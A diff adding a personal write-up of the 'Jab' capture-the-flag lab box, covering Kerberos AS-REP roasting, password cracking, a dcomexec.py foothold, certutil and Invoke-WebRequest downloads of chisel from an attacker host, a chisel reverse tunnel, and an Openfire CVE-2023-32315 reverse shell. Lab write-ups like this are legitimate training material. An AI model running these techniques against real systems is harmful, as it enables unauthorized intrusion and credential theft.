@@ -1,0 +1,91 @@
+Box name - Jab
+Box "Difficulty" - Medium
+Starting 02/26/2024 
+Finished 03/01/2024
+
+My difficulty ratings based on MY experience:
+User 6.5/10
+Root 5/10 
+
+Steps I took to solve this box. 
+
+nmap - saw ports that displayed a possible chat server. It also displayed port 88 for kerberos authentication. 
+
+Using kerbrute you can enumerate the users 
+
+In the Rubeus toolset you can utilize asreproast to get the hashes of users that don't require preauthentication. 
+
+This gave me a list of three users to choose from. 
+
+XXXX@jab.htb 
+XXXXXXXXX@jab.htb 
+XXXXXXXXXXX@jab.htb 
+
+I saved the hashes to hashes.txt then ran them through john. You could have also used hashcat. Either works since they're basically just doing compares with rockyou.txt. 
+
+Now we've got a password for XXXXXXXXXXX@jab.htb, it's XXXXXXXXXXX.  
+
+XMPP is a chat protocol that's originally called Jabber. 
+
+Use Pidgin to connect to the XMPP server using XXXXXXXXXXX's creds. Then you can find the chat room that he's a member of in the roomlist. 
+
+Some juicy stuff in there - XXXXXXXXXXXX password is listed. The hashcat results can be a little confusing/frustrating to read at first. I've just always output to a text file so I haven't actually had to look for them (embarrasing I know). 
+
+Any case - This is where I started to really use tools that I'm not familiar with. 
+
+Impacket - This is a collection of python classes and scripts used to test various protocols. This creates the raw packets / requests. The first one you'll use is dcomexec.py
+
+dcom is exlained well here - https://wadcoms.github.io/wadcoms/Impacket-DCOMExec/
+
+dcomexec.py -object MMC20 jab.htb/XXXXXXXXXXXX:'password'@IP 'payload' -silentcommand 
+
+This is what you send to get hte intial foothold. 
+
+OK now we're in the box. Grab that user.txt file that lives on the XXXXXXXXXXXX's desktop.
+
+The hardest part of getting root is port forwarding. I recently did a box that you port forward through SSH. I was blown away on that one (never did that before). This time was definitely a little more frustrating lol. 
+
+Going to utilize another tool called Chisel. Thisacts the same as an SSH tunnel except it's written in Go. 
+
+Grab the latest version on Git. https://github.com/jpillora/chisel You'll want to grab both the Windows and linux versions. Unless you're using a windows box for pen testing for some reason. 
+
+gunzip -d *.gz, then start a http.server. 
+
+Since windows is dumb and you can't just say 'wget URL' you need to use either certutil or invote-webrequest. 
+
+certutil would obviously work if you're in commandline and not ps. 
+
+Invoke-WebRequest -Uri http://10.10.x.x:8000/chisel.exe -OutFile chisel.exe
+certutil.exe -urlcache -f http://10.10.x.x:8000/chisel.exe chisel.exe
+
+OpenFire default admin port 9090 - https://docs.bitnami.com/aws/apps/openfire/get-started/understand-default-config/#:~:text=SSL/TLS%20method.-,9090,-%2D%20Admin%20Console%20%2D%20The
+
+Now you can run chisel to create the tunnel. 
+./chisel.exe client 10.10.x.x:8050 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091 - windows side
+./chisel server -p 8050 --reverse - your linux box (chisel.exe if you're using windows. Don't forget to chmod chisel before running on linux). 
+
+Now you can navigate to http://127.0.0.1:9090 and it'll bring up the admin portal for OpenFire. 
+
+Looking at the sign in you can see the version that's currently installed. After a quick google search https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm. 
+
+Taking the CVE from git you can find a good walkthrough on how to exploit here. 
+https://www.vicarius.io/vsociety/posts/cve-2023-32315-path-traversal-in-openfire-leads-to-rce
+
+(you can skip to the plugin part since your account is already admin)
+
+Eventually you'll end up at a spot where you can run commands from the admin panel. Use revshells to step through the powershell scripts until one works. 
+
+You're in, now you can go to the administrator to get the root.txt. 
+
+
+My takeaways on this box. 
+
+	- I had never heard of XMPP, honestly. The thing that stood out the most on this box was the users not having pre-auth checked and how that can be exploited. 
+	
+	- I'm not very familiar with impacket as it seems to mostly be used with Windows boxes. I feel that I've heard of it before but I haven't dug into it. This was a good chance to learn about a couple of the tools within. 
+	
+	- Creating a port forward tunnel seems to be more common than I realize.  
+
+	- I need to familiarize myself with equivalent commands in windows vs linux... or maybe they can just include things like wget ;)
+	
+	
